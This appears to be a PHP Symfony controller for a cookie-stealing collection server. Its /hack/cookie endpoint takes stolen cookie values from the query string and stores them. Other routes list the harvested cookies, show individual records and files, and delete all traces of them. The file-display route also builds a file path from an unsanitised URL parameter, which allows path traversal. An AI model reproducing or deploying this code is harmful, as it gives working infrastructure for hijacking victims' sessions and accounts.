<?php

namespace App\Controller;

use App\Entity\CookieRecord;
use App\Repository\CookieRecordRepository;
use App\Services\CookieWorkerService;
use DateTimeImmutable;
use DateTimeZone;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;

class HackController extends AbstractController
{
    CONST STORAGE_PATH = "../var/storage/";
    private CookieRecordRepository $cookieRecordRepository;
    private CookieWorkerService $cookieWorkerService;

    /**
     * @param CookieRecordRepository $cookieRecordRepository
     * @param CookieWorkerService $cookieWorkerService
     */
    public function __construct(CookieRecordRepository $cookieRecordRepository, CookieWorkerService $cookieWorkerService)
    {
        $this->cookieRecordRepository = $cookieRecordRepository;
        $this->cookieWorkerService = $cookieWorkerService;
    }

    #[Route('/hack', name: 'app_hack')]
    public function index(): Response
    {
        $cookieFileList = scandir($_ENV["STORAGE_PATH"]);
        array_splice($cookieFileList,0,2);
        $cookieFiles = [];
        foreach($cookieFileList as $c){
            $cookieFiles[] = [
                "createdAt"=>filectime($_ENV["STORAGE_PATH"].$c),
                //"name"=>$c
                "name"=>pathinfo($_ENV["STORAGE_PATH"].$c)["filename"]
            ];
        }
        return $this->render('hack/index.html.twig', [
            'storedCookies'=>$this->cookieRecordRepository->findAll(),
            "cookieFiles"=>$cookieFiles
        ]);
    }

    #[Route('/hack/clean', name: 'app_hack_clean')]
    public function clean(): Response
    {
        $cookieFileList = scandir(self::STORAGE_PATH);
        array_splice($cookieFileList,0,2);


        foreach ($this->cookieRecordRepository->findAll() as $record){
            $this->cookieRecordRepository->remove($record,true);
        }

        foreach($cookieFileList as $file){
            unlink(self::STORAGE_PATH.$file);
        }


        return $this->redirectToRoute('app_hack');
    }

    #[Route('/hack/cookies/files/{filename}', name: 'app_hack_cookie_file_content')]
    public function showCookieFileContent(string $filename): Response
    {
        $content = json_decode(file_get_contents(self::STORAGE_PATH."$filename.json"),true);
        $createdAt = filectime($_ENV["STORAGE_PATH"]."$filename.json");
        return $this->render('hack/show-cookie-file-content.html.twig', [
            "content"=>$content,
            "createdAt"=>$createdAt,
            "filename"=>$filename
        ]);
    }

    #[Route('/hack/cookies/records/{id}', name: 'app_hack_cookie_record')]
    public function showCookieRecord(CookieRecord $record): Response
    {
        return $this->render('hack/show-cookie-record.html.twig', ["record"=>$record]);
    }


    #[Route('/hack/cookie', name: 'app_hack_cookies')]
    public function grabCookies(Request $request): Response
    {
        $message = "No cookie for me ... ok that's was just a test ...";
        if($request->query->get('cookie') && $request->query->get('output')){
            $this->cookieWorkerService->proceedCookie($request->query->get('cookie'),$request->query->get('output'));
            $message = "Thank's for your cookies, yummy !";
        }

        return $this->render('hack/compromised.html.twig', [
            "message"=>$message
        ]);
    }



}
